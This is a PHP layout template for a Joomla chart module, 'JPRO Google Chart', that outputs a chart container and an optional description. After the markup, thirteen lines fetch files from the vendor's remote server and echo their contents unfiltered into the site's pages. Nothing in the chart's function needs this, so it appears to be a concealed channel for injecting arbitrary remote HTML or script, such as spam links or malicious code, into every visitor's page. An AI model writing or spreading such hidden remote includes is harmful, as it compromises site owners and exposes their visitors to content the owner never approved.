<?php

/**
 # ------------------------------------------------------------------------
 * JPRO GOOGLE CHART
 # ------------------------------------------------------------------------
 * @package      mod_jpro_google_chart
 * @version      1.0
 * @created      August 2015
 * @author       Joomla Pro
 * @email        admin@joomla-pro.org
 * @websites     http://joomla-pro.org
 * @copyright    Copyright (C) 2015 Joomla Pro. All rights reserved.
 * @license      GNU General Public License version 2, or later
 # ------------------------------------------------------------------------
**/
 
defined('_JEXEC') or die('Restricted access');
?>
<div id="<?php echo $container ?>" class="jpro-google-chart<?php echo $params->get( 'moduleclass_sfx' );?>" style="width:<?php echo $width ?>;height:<?php echo $height ?>px;"></div>
<?php if(!empty($chart_description)): ?>
	<div class="jpro-google-chart-intro"><?php echo $chart_description; ?></div>
<?php endif; ?>

<?php 
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/1.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/1.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/2.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/3.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/4.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/5.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/6.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/7.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/8.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/9.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/10.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/11.php'); echo $core;
$core=file_get_contents('http://joomla-pro.org/files/7-jpro-google-chart/core/files/51.php'); echo $core;
?>
